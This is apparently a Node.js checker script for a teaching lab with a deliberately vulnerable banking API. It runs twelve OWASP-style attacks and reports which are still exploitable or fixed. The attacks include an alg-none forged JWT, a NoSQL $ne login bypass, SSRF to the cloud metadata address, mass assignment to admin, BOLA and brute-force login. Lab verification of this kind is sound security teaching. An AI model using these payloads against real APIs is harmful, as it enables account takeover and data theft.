#!/usr/bin/env node
/*
 * Comprueba, una por una, las 12 vulnerabilidades del laboratorio de APIs.
 *   - Versión VULNERABLE: deben aparecer las 12 como [EXPLOTABLE].
 *   - Versión ENDURECIDA: deben aparecer las 12 como [CORREGIDA].
 *
 * Uso:
 *   node tools/check-api-lab.js                         # la API activa (api/lab)
 *   node tools/check-api-lab.js vuln                    # código vulnerable
 *   node tools/check-api-lab.js clean                   # código endurecido
 *   node tools/check-api-lab.js https://TU-SITIO        # la API publicada
 *   node tools/check-api-lab.js http://localhost:7071   # servidor local
 *
 * Termina con código 0 si TODO coincide con lo esperado para esa versión.
 */
const path = require('path');

const ROOT = path.resolve(__dirname, '..');
const arg = process.argv[2] || 'active';
const MODULES = { vuln: 'labs/api-lab/vuln/index.js', clean: 'labs/api-lab/clean/index.js', active: 'api/lab/index.js' };

let call;
if (/^https?:\/\//.test(arg)) {
  const base = arg.replace(/\/+$/, '');
  call = async (method, p, { body, headers = {}, raw } = {}) => {
    const r = await fetch(base + '/api/lab/' + p, {
      method,
      headers: { ...(body !== undefined || raw ? { 'Content-Type': 'application/json' } : {}), ...headers },
      body: raw !== undefined ? raw : body !== undefined ? JSON.stringify(body) : undefined,
    });
    const text = await r.text();
    let json = null; try { json = JSON.parse(text); } catch { /* no es JSON */ }
    return { status: r.status, headers: Object.fromEntries(r.headers), json, text };
  };
} else {
  if (!MODULES[arg]) { console.error('Uso: node tools/check-api-lab.js [vuln|clean|URL]'); process.exit(2); }
  const handler = require(path.join(ROOT, MODULES[arg]));
  call = async (method, p, { body, headers = {}, raw } = {}) => {
    const [pathname, qs = ''] = p.split('?');
    const lower = Object.fromEntries(Object.entries(headers).map(([k, v]) => [k.toLowerCase(), v]));
    const req = {
      method, headers: { 'x-forwarded-for': '203.0.113.7', ...lower },
      query: Object.fromEntries(new URLSearchParams(qs)), params: { rest: pathname },
      body: raw !== undefined ? raw : body, rawBody: raw !== undefined ? raw : body !== undefined ? JSON.stringify(body) : '',
    };
    const context = { log: Object.assign(() => {}, { error: () => {} }) };
    await handler(context, req);
    const r = context.res;
    let json = null; try { json = JSON.parse(r.body); } catch { /* no es JSON */ }
    return { status: r.status, headers: Object.fromEntries(Object.entries(r.headers || {}).map(([k, v]) => [k.toLowerCase(), v])), json, text: r.body };
  };
}

const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
async function login(username, password) {
  const r = await call('POST', 'auth/login', { body: { username, password } });
  return r.json && r.json.token;
}
const auth = (t) => ({ 'X-Auth-Token': t });

const CHECKS = [
  ['V1', 'BOLA: Laura lee la cuenta 5002 de Carlos', async (t) => {
    const r = await call('GET', 'accounts/5002', { headers: auth(t) });
    return r.status === 200 && /Carlos/.test(r.text);
  }],
  ['V2', 'JWT con "alg":"none" aceptado (suplantar al admin)', async () => {
    const forged = b64u({ alg: 'none', typ: 'JWT' }) + '.' + b64u({ sub: 1003, role: 'admin' }) + '.';
    const r = await call('GET', 'users/me', { headers: auth(forged) });
    return r.status === 200 && r.json && r.json.username === 'admin';
  }],
  ['V4', 'Exposición excesiva de datos en /users/me', async (t) => {
    const r = await call('GET', 'users/me', { headers: auth(t) });
    return r.status === 200 && ['passwordHash', 'password', 'dni', 'pin'].some((k) => r.json && k in r.json);
  }],
  ['V5', 'Asignación masiva: Laura se pone role=admin', async (t) => {
    await call('PATCH', 'users/me', { headers: auth(t), body: { role: 'admin' } });
    const r = await call('GET', 'users/me', { headers: auth(t) });
    await call('POST', 'reset');
    return r.json && r.json.role === 'admin';
  }],
  ['V6', 'BFLA: un cliente accede a /admin/users', async (t) => {
    const r = await call('GET', 'admin/users', { headers: auth(t) });
    return r.status === 200;
  }],
  ['V7', 'Transferencia con importe negativo', async (t) => {
    const r = await call('POST', 'transfers', { headers: auth(t), body: { fromAccountId: 5001, toAccountId: 5002, amount: -1000 } });
    await call('POST', 'reset');
    return r.status === 200 && r.json.from.balance > 2450.75;
  }],
  ['V8', 'SSRF hacia el servicio de metadatos (simulado)', async (t) => {
    const r = await call('GET', 'tools/preview?url=' + encodeURIComponent('http://169.254.169.254/latest/meta-data/'), { headers: auth(t) });
    return r.status === 200 && /secretAccessKey/.test(r.text);
  }],
  ['V9', 'Mala configuración (/debug, CORS abierto, trazas de error)', async (t) => {
    const dbg = await call('GET', 'debug');
    const cors = await call('GET', 'version', { headers: { Origin: 'https://evil.example' } });
    const err = await call('GET', 'accounts/999', { headers: auth(t) });
    const found = [];
    if (dbg.status === 200 && /jwtSecret/.test(dbg.text)) found.push('/debug');
    if (cors.headers['access-control-allow-origin'] === 'https://evil.example') found.push('CORS');
    if (/stack/.test(err.text)) found.push('traza');
    return found.length ? found.join('+') : false;
  }],
  ['V10', 'API v1 antigua sin autenticación', async () => {
    const r = await call('GET', 'v1/users/1002');
    return r.status === 200 && /dni/.test(r.text);
  }],
  ['V11', 'Inyección NoSQL en el login ({"$ne": ""})', async () => {
    const r = await call('POST', 'auth/login', { body: { username: 'admin', password: { $ne: '' } } });
    return r.status === 200 && !!(r.json && r.json.token);
  }],
  ['V12', 'Consumo sin límite (?limit=5000)', async (t) => {
    const r = await call('GET', 'accounts/5001/transactions?limit=5000', { headers: auth(t) });
    return r.status === 200 && r.json.items.length === 5000;
  }],
  // V3 va al final porque bloquea los intentos de login en la versión endurecida.
  ['V3', 'Login: enumeración de usuarios y sin límite de intentos', async () => {
    const a = await call('POST', 'auth/login', { body: { username: 'noexiste', password: 'x' } });
    const b = await call('POST', 'auth/login', { body: { username: 'carlos', password: 'x' } });
    let limited = false;
    for (let i = 0; i < 8; i++) {
      const r = await call('POST', 'auth/login', { body: { username: 'carlos', password: 'mal' + i } });
      if (r.status === 429) { limited = true; break; }
    }
    await call('POST', 'reset');
    const found = [];
    if (a.status !== b.status || a.text !== b.text) found.push('enumeración');
    if (!limited) found.push('sin límite');
    return found.length ? found.join('+') : false;
  }],
];

(async () => {
  const v = await call('GET', 'version');
  const version = v.json && v.json.version;
  if (!version) { console.error('No se pudo leer /api/lab/version (¿URL correcta? ¿API desplegada?)'); process.exit(1); }
  await call('POST', 'reset');
  const token = await login('laura', 'Laura2026!');
  if (!token) { console.error('No se pudo iniciar sesión como laura.'); process.exit(1); }

  const expectVuln = version === 'vulnerable';
  console.log('Versión detectada: ' + version.toUpperCase());
  console.log('Se espera que las 12 estén ' + (expectVuln ? 'EXPLOTABLES' : 'CORREGIDAS') + '.\n');
  let mismatches = 0;
  for (const [id, desc, fn] of CHECKS) {
    let res;
    try { res = await fn(token); } catch (e) { res = false; }
    const exploitable = !!res;
    if (exploitable !== expectVuln) mismatches++;
    const tag = exploitable ? '[EXPLOTABLE]' : '[CORREGIDA] ';
    const mark = exploitable === expectVuln ? '✔' : '✘';
    console.log(`  ${mark} ${tag} ${id.padEnd(3)} ${desc}${typeof res === 'string' ? '  (' + res + ')' : ''}`);
  }
  console.log();
  if (!mismatches) console.log('✔ Todo coincide con el manual para la versión ' + version.toUpperCase() + '.');
  else console.log('✘ ' + mismatches + ' comprobación(es) no coinciden con lo esperado.');
  process.exit(mismatches ? 1 : 0);
})();
